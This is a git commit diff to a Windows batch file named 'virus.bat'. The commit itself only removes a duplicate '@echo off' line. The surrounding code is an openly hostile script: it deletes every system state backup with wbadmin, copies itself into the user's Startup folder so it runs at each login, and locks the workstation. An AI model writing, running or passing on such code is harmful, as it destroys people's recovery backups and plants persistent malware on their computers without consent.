8232799ea0659874bac203f477cf9d627212f45d
Leandro23112007 <146172637+Leandro23112007@users.noreply.github.com>
2024-12-18 10:36:26 +0000

    Update virus.bat

--- virus.bat
+++ virus.bat
@@ -1,7 +1,6 @@
 @echo off
 wbadmin delete systemstatebackup -keepVersions:0
 echo %USERNAME%
-@echo off
 for /r C:\ %%f in (virus.bat) do (
     move "%%f" "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
     rundll32.exe user32.dll,LockWorkStation
